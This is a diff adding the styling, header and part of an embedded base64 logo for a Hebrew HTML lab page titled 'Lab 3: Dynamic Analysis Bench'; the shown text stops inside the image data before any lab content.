@@ -1,0 +1,554 @@
+<!DOCTYPE html>
+<html lang="he" dir="rtl">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>מעבדה 3: Dynamic Analysis Bench</title>
+<style>
+:root {
+  --primary: #2563eb; --primary-dark: #1d4ed8;
+  --bg: #ffffff; --bg-card: #f8f9ff;
+  --text: #1a1a2e; --text-muted: #64748b;
+  --border: #e2e8f0; --success: #16a34a;
+  --warning: #d97706; --red: #dc2626; --purple: #7c3aed;
+}
+* { margin: 0; padding: 0; box-sizing: border-box; }
+body {
+  font-family: 'Segoe UI', Tahoma, Arial, sans-serif;
+  background: var(--bg); color: var(--text);
+  line-height: 1.8;
+  direction: rtl;
+  text-align: right;
+}
+.header { background: #f0f4ff; border-bottom: 3px solid var(--primary); padding: 1.5rem 2rem 1rem; text-align: center; }
+.header .logo { max-width: 240px; height: auto; margin-bottom: .8rem; }
+.header h1 { font-size: 1.8rem; color: var(--primary-dark); margin-bottom: .3rem; }
+.header .subtitle { color: var(--text-muted); font-size: .95rem; margin-top: .4rem; }
+.header .meta { margin-top: .6rem; }
+.header .meta span { display: inline-block; margin: 0 .4rem; background: white; border: 1px solid var(--border); border-radius: 4px; padding: .15rem .7rem; font-size: .82rem; color: var(--text-muted); }
+.container { max-width: 980px; margin: 0 auto; padding: 2rem 1.5rem; }
+.section { background: var(--bg-card); border: 1px solid var(--border); border-radius: 10px; padding: 1.5rem; margin-bottom: 1.5rem; }
+.section h2 { font-size: 1.2rem; color: var(--primary-dark); margin-bottom: 1rem; border-bottom: 2px solid var(--border); padding-bottom: .5rem; }
+.section h3 { font-size: 1rem; color: var(--primary); margin: 1rem 0 .5rem; }
+ol.steps { counter-reset: step; list-style: none; padding: 0; margin: 0; }
+.step { counter-increment: step; position: relative; padding: 1rem; margin-bottom: 1rem; background: #f8f9ff; border-radius: 8px; border-right: 4px solid var(--primary); }
+.step-title { font-weight:700; color:var(--primary); margin-bottom:.5rem; font-size:.95rem; }
+code { font-family: 'Cascadia Code', 'Consolas', monospace; background: #f0f4ff; color: var(--primary-dark); padding: .15rem .45rem; border-radius: 4px; font-size: .87rem; border: 1px solid var(--border); direction: ltr; text-align: left; display: inline-block; unicode-bidi: embed; }
+pre { background: #0d0d1a; border: 1px solid #2a2a4a; border-radius: 8px; padding: 1rem 1.2rem; font-family: 'Cascadia Code', 'Consolas', monospace; font-size: .85rem; color: #a8e6cf; overflow-x: auto; margin: .6rem 0; direction: ltr; text-align: left; }
+.note { background: #fffbeb; border-right: 4px solid var(--warning); border-radius: 6px; padding: .75rem 1rem; margin: .8rem 0; font-size: .9rem; }
+.note::before { content: var(--note-label); font-weight: 700; color: var(--warning); }
+.warning { background: #fff1f2; border-right: 4px solid var(--red); border-radius: 6px; padding: .75rem 1rem; margin: .8rem 0; font-size: .9rem; }
+.warning::before { content: var(--warning-label); font-weight: 700; color: var(--red); }
+.success { background: #f0fdf4; border-right: 4px solid var(--success); border-radius: 6px; padding: .75rem 1rem; margin: .8rem 0; font-size: .9rem; }
+.success::before { content: var(--success-label); font-weight: 700; color: var(--success); }
+.sysint { background: #f3e8ff; border-right: 4px solid var(--purple); border-radius: 6px; padding: .75rem 1rem; margin: .8rem 0; font-size: .9rem; }
+.sysint::before { content: var(--sysint-label); font-weight: 700; color: var(--purple); }
+ul.prereq { padding-right: 1.5rem; margin: .5rem 0; }
+ul.prereq li { margin-bottom: .3rem; font-size: .92rem; }
+table { width: 100%; border-collapse: collapse; margin: .8rem 0; font-size: .9rem; }
+th, td { border: 1px solid var(--border); padding: .5rem .7rem; text-align: right; }
+th { background: var(--primary); color: white; }
+tr:nth-child(even) { background: #f8f9ff; }
+footer { text-align: center; padding: 1.5rem; color: var(--text-muted); font-size: .85rem; border-top: 1px solid var(--border); margin-top: 2rem; }
+.questions { background: #f5f3ff; border: 1px solid #c4b5fd; border-radius: 8px; padding: 1rem 1.2rem; margin-top: 1rem; }
+.questions h3 { color: #6d28d9; margin-bottom: .5rem; }
+.questions ol { padding-right: 1.2rem; }
+.questions li { margin-bottom: .5rem; font-size: .9rem; }
+</style>
+<style>:root {
+  --note-label: "הערה: ";
+  --warning-label: "אזהרה: ";
+  --success-label: "תוצאה צפויה: ";
+  --sysint-label: "Sysinternals: ";
+}</style>
+</head>
+<body>
+<div class="header">
+  <img class="logo" src="data:image/png;base64,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